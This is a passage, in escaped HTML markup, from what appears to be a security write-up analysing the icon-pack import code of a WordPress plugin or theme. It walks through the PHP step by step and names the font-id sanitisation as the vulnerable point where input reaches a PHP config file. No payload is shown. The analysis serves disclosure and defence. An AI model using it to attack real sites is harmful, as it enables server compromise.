class=&#34;c1&#34;&gt;//&amp;ensp;Sanitize&amp;ensp;each&amp;ensp;tag&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$safe_tags&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;array_map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sanitize_text_field&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw_tags&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tags&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;implode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$safe_tags&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_class&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tags&amp;#34;&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tags&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_config&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unknown&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;write_config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;re_write_css&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rename_files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rename_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add_font&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function is the &lt;strong&gt;core&lt;/strong&gt; of the Icon Pack importing process. It is responsible for reading data from the SVG and JSON files, then generating the icon configuration used by the plugin.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Check for required files&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;find_json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;svg_file&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;find_svg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;svg_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;SVG&amp;ensp;file&amp;ensp;or&amp;ensp;selection.json&amp;ensp;not&amp;ensp;found...&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The plugin searches for a &lt;code&gt;.json&lt;/code&gt; file and an &lt;code&gt;.svg&lt;/code&gt; font file in the temporary directory.&lt;/li&gt;&#xA;&lt;li&gt;If one of them is missing, the process is aborted.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Read SVG and JSON contents&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_remote_fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempurl&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;svg_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$json&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;wp_remote_fopen&lt;/code&gt; to read the SVG via URL, falling back to &lt;code&gt;file_get_contents&lt;/code&gt; if it fails.&lt;/li&gt;&#xA;&lt;li&gt;Reads the JSON directly from the temporary directory.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Parse SVG to get the font name&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$xml&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;simplexml_load_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$font_attr&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$xml&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;defs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;font&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;attributes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$font_attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Extracts the &lt;code&gt;id&lt;/code&gt; attribute of the &lt;code&gt;&amp;lt;font&amp;gt;&lt;/code&gt; tag as the font name (&lt;code&gt;ip_name&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Only sanitized using &lt;code&gt;sanitize_text_field()&lt;/code&gt; → this is the vulnerable point, because it does not remove dangerous characters in the context of a PHP file.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Check for name collisions&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$font_folder&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fontdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$font_folder&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;There&amp;ensp;is&amp;ensp;already&amp;ensp;an&amp;ensp;Icon&amp;ensp;Pack&amp;ensp;with&amp;ensp;this&amp;ensp;name...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span 